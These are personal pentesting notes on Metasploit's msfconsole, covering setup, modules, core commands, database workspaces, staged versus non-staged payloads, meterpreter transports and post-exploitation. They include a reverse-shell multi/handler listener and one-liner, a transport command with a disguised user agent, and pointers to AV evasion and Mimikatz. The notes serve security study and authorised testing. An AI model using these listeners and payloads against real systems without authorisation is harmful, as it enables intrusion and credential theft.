# Metasploit 
This as simple document condensing the usage of the `msfconsole`. For specific [[Meterpreter-Commands]] related follow the link for [[Pivoting-and-Proxying-with-Metasploit]] follow this one. For a brief `msvenom` usage see [[Shells]] or for building a Metasploit module see [[Build-MSF-Modules]] 

![meterpeter](Images/msf-popped-shell.gif)


## Introduction

[Metasploit](https://www.metasploit.com/) despite its nae sayers is an incredible tool making the figgly manual process more stream-line and less error prown. It's curation of exploit code helps address the issues with dangers of using public exploit code as well providing the utility of post exploit and enumeration tools in one console framework. Although for those post beginner phase I would recommend as was to me, learn the wonders of metasploit then do it manually, Exploit Frameworks like Metasploit are used because the reduce issues and complexity. It also Open-Source, although similar to Burpsuite in the respect that its core functionality is so very powerful that the commercial version is not really relevent to those that aren't professionals. Metasploit is even more overwhelming in features than Burpsuite Community the Pro version provides alot of features to the Open source version, as awesome as they are the path to learn to use something that makes it easy to not make mistakes is the reason that Metasploit is still awesome and you can learn, apply skill manually and use other tools for much of the [Pro version](https://www.rapid7.com/products/metasploit/download/editions/) offers. 

## Setup
Metasploit on Kali requires postgresql setup:
```bash
sudo systemctl start postgresql
sudo systemctl enable postgresql
sudo msfdb init
sudo msfconsole -q
```

For ParrotOS [see](https://github.com/ParrotSec/metasploit-framework)

## Modules

Module Name | Description
--- | ---
Auxiliary |  Non-Exploit, like scanning, fuzzing, sniffing and enumeration against services
Encoders | Encoders will allow you to encode the exploit and payload for AV
Evasion | Anti-Virus Evasion modules
Exploits | `searchsploit` and `search` for Exploits
NOPs | Used in payload sizing, by keeping them consistent, to cause intended and not unintended side effect when attempting exploitation.
Payload | Single(one contiguous exploiation process), Stagers(Staged process setup connection to MS to receive Stages in ... stages), Stages(sent to the Stager)
Post | Post-Exploitation phase

## Simple and useful

Start a listener, set payload, configure options, bang head off the keys: E X P L O I T
```msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LISTENING-IP
set LPORT $LISTENING-PORT
exploit
```
Or linux one-liner
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST $interface; set LPORT 4444;exploit"
```

Web Delivery [[Crackmapexec-Cheatsheet]] smb Module `met_inject`


## Commands

```msfconsole
background		# background a session
				# OR CTRL+Z
check			# check if system is vulnerable(SOME MODULES HAVE THIS)
exploit					# launch the exploit
	-z					# background exploit when run
info <module-name> 		# display inforamtion about <module-name>
						# -j for json, -d markdown
jobs					# display jobs
	–k					# kill jobID
	
options					# displays options
search					# searches
search type:<module>  	# search by module
search name:<name>	 	# search by name

session	<number>		# switch or refer to a session
sessions				# list all sessions
	-i					# interact with session number
set						# set data for options
setg					# set global data
show	# display parametres: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options
		# module-specific: missing, advanced, evasion, targets, actions
show advanced			# show advanced options
use 			# select a module
```

## Database Access
```bash
services -h

Usage: services [-h] [-u] [-a] [-r <proto>] [-p <port1,port2>] [-s <name1,name2>] [-o <filename>] [addr1 addr2 ...]

  -a,--add          Add the services instead of searching
  -d,--delete       Delete the services instead of searching
  -c <col1,col2>    Only show the given columns
  -h,--help         Show this help information
  -s <name>         Name of the service to add
  -p <port>         Search for a list of ports
  -r <protocol>     Protocol type of the service being added [tcp|udp]
  -u,--up           Only show services which are up
  -o <file>         Send output to a file in csv format
  -O <column>       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -U,--update       Update data for existing service

Available columns: created_at, info, name, port, proto, state, updated_at

db_status # View connection to metasploit database
workspace # -a to add -d to delete 

Database Backend Commands
=========================

    Command           Description
    -------           -----------
    creds             List all credentials in the database
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces

```

Workspace according to [Rapid7](https://docs.rapid7.com/metasploit/managing-workspaces/): *"Workspaces enable you to segment and manage the hosts and data stored in the database. You can use workspaces to create a logical separation for each segment that you want to test. For example, you may want to create a workspace for each subnet within an organization to limit the hosts to a specific network. Departments like HR, IT, and Accounting would each have its own workspace."*

```bash
workspace -h
Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
	workspace -r               Rename workspace
    workspace -h               Show this help information
```


## Auxiliary Modules Commands

```msfconsole
show auxiliary # see all auxiliary modules
```

## Exploit Module Commands

```msfconsole

show payloads 	# Check compatable payloads - VERY important
set payload 	# Assign payload choice to exploit
check			# Some exploit check if the provided <options> RHOST is vulnerable
```

## Metasploit Payloads

Non-Staged | Staged
--- | ---
shell_reverse_tcp | shell/reverse_tcp

Non-staged(Non-meterpreter) payloads are sent with the exploit and compatible with nc because they do not require the payload from msfconsole after the stager payload is executed on victim host. 
Staged are sent two or more parts, the first staging and connecting back to Attacker then subsequently transfering larger payload containing the remainder of the shellcode. Staged payload are more likely to evade AV due to size. Exstensive listing of payloads can be found: [[MSFvenom-Payloads]].

## Meterpreter

Meterpreter is payload type that can dynamically extended at run-time providing more features and functionality than regular reverse shell. Meterpreter payload versions are written in probably every operationally-in-use programming language. For a full list of commands see [[Meterpreter-Commands]].

## Exploit Multi Handler
For advanced Metasploit payloads use the builtin listener with
`use multi/handler` just `set payload insert/payload/name` and `show options` and `show advanced` to see configuration and `set <some option name>` to configure. `exploit` or `run` to execute the multi/handler and `-j` to background on execution.

## Client Side Attacks
[Offensive Sercurity](https://www.offensive-security.com/metasploit-unleashed/client-side-attacks/): *"As network administrators and software developers fortify the perimeter, pentesters need to find a way to make the victims open the door for them to get into the network. Client side attacks require user-interaction such as enticing them to click a link, open a document, or somehow get to your malicious website."*

## Meterpreter Transports

Transports are the answer to making meterpreter connect over various protocols, see [Transports Documentation](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html). 
```bash
transport list # to list 
transport add -t reverse_http -l 10.10.10.10 -p 5105 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1"
# -l lhost; -p lport, -T retry total, -W retry wait, -C communication timeout, -A custom user agent 

```

## Metasploit Post Exploitation

Metasploit has post-exploitation features and MSF modules that take an active sessions as an argument. These features are best examplified with the various [[Meterpreter-Commands]], although a important feature is `migrate $PSID`-ing to different more stable and more privileged processes in memory. With the `load` command in a Meterpreter one load various modules such as `powershell` and then `powershell_execute`, see [[Useful_Powershell]] for help with basic powershell. Similar `load kiwi` will load [[Mimikatz-Cheatsheet]]. For [[Pivoting-and-Proxying-with-Metasploit]], it different for different version of Metasploit.

## Further Automation
We can pass a .rc file that automates the entire process in similar way as recent versions of [[Recon-ng]].
```bash
sudo msfconsole -r setup.rc
```

## References

[Metasploit](https://www.metasploit.com/)
[Github Metasploit ParrotOS](https://github.com/ParrotSec/metasploit-framework)
[OS Guide to setting up DB](https://www.offensive-security.com/metasploit-unleashed/using-databases/)
[Rapid7 Workspaces](https://docs.rapid7.com/metasploit/managing-workspaces/)
[darkreading on client side attacks](https://www.darkreading.com/risk/anatomy-of-a-client-side-attack-using-metasploit)
[OS Client Side attacks with Metasploit](https://www.offensive-security.com/metasploit-unleashed/client-side-attacks/)
[Gif source](https://www.offensive-security.com/offsec/what-to-expect-new-oscp-exam/)
